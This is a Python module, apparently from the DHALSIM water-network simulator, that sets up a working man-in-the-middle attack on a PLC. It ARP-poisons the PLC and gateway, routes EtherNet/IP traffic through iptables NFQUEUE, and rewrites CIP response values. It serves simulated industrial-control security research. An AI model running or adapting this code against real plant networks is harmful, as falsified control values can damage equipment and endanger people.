import argparse
import os
from pathlib import Path
import threading

import fnfqueue
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw

from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp, \
    translate_payload_to_float, translate_float_to_payload
from dhalsim.network_attacks.synced_attack import SyncedAttack


class PacketAttack(SyncedAttack):
    """
    This is a packet attack class.

    :param intermediate_yaml_path: The path to the intermediate YAML file
    :param yaml_index: The index of the attack in the intermediate YAML
    """

    def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
        super().__init__(intermediate_yaml_path, yaml_index)
        os.system('sysctl net.ipv4.ip_forward=1')
        self.queue = fnfqueue.Connection()
        self.thread = None
        self.run_thread = False

    def setup(self):
        """
        This function start the network attack.

        It first sets up the iptables on the attacker node to capture the tcp packets coming from
        the target PLC. It also drops the icmp packets, to avoid network packets skipping the
        attacker node.

        Afterwards it launches the ARP poison, which basically tells the network that the attacker
        is the PLC, and it tells the PLC that the attacker is the router.

        Finally, it launches the thread that will examine all captured packets.
        """
        os.system(
            f'iptables -t mangle -A PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
        os.system('iptables -A FORWARD -p icmp -j DROP')
        os.system('iptables -A INPUT -p icmp -j DROP')
        os.system('iptables -A OUTPUT -p icmp -j DROP')

        launch_arp_poison(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        self.logger.debug(f"Naive MITM Attack ARP Poison between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        try:
            self.q = self.queue.bind(1)
            self.q.set_mode(fnfqueue.MAX_PAYLOAD, fnfqueue.COPY_PACKET)
        except PermissionError:
            self.logger.error("Permission Error. Am I running as root?")

        self.run_thread = True
        self.thread = threading.Thread(target=self.packet_thread_function)
        self.thread.start()

    def packet_thread_function(self):
        """
        This function is the function that will run in the thread started in the setup function.

        For every packet that enters the netfilterqueue, it will check its length. If the length is
        in between 100 and 116, we are dealing with a CIP packet. We then change the payload of that
        packet and delete the original checksum.
        """
        while self.run_thread:
            try:
                for packet in self.queue:
                    p = IP(packet.payload)
                    # Packets with 100 <= length < 116 are CIP response packets
                    if 100 <= p[IP].len < 116:
                        if 'value' in self.intermediate_attack.keys():
                            p[Raw].load = translate_float_to_payload(
                                self.intermediate_attack['value'], p[Raw].load)
                        elif 'offset' in self.intermediate_attack.keys():
                            p[Raw].load = translate_float_to_payload(
                                translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
                                    'offset'], p[Raw].load)

                        del p[TCP].chksum
                        del p[IP].chksum

                        packet.payload = bytes(p)
                        self.logger.debug("Network packet value overwritten.")

                    packet.mangle()

            except fnfqueue.BufferOverflowException:
                print("Buffer Overflow in a MITM attack!")

    def interrupt(self):
        """
        This function will be called when we want to stop the attacker. It calls the teardown
        function if the attacker is in state 1 (running)
        """
        if self.state == 1:
            self.teardown()

    def teardown(self):
        """
        This function will undo the actions done by the setup function.

        It first restores the arp poison, to point to the original router and PLC again. Afterwards
        it will delete the iptable rules and stop the thread.
        """
        restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
        self.logger.debug(f"Naive MITM Attack ARP Restore between {self.target_plc_ip} and "
                          f"{self.intermediate_attack['gateway_ip']}")

        os.system(
            f'iptables -t mangle -D PREROUTING -p tcp --sport 44818 -s {self.target_plc_ip} -j NFQUEUE --queue-num 1')
        os.system('iptables -D FORWARD -p icmp -j DROP')
        os.system('iptables -D INPUT -p icmp -j DROP')
        os.system('iptables -D OUTPUT -p icmp -j DROP')

        self.run_thread = False
        self.queue.close()
        self.thread.join()

    def attack_step(self):
        """This function just passes, as there is no required action in an attack step."""
        pass


def is_valid_file(parser_instance, arg):
    """Verifies whether the intermediate yaml path is valid."""
    if not os.path.exists(arg):
        parser_instance.error(arg + " does not exist")
    else:
        return arg


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Start everything for an attack')
    parser.add_argument(dest="intermediate_yaml",
                        help="intermediate yaml file", metavar="FILE",
                        type=lambda x: is_valid_file(parser, x))
    parser.add_argument(dest="index", help="Index of the network attack in intermediate yaml",
                        type=int,
                        metavar="N")

    args = parser.parse_args()

    attack = PacketAttack(
        intermediate_yaml_path=Path(args.intermediate_yaml),
        yaml_index=args.index)
    attack.main_loop()
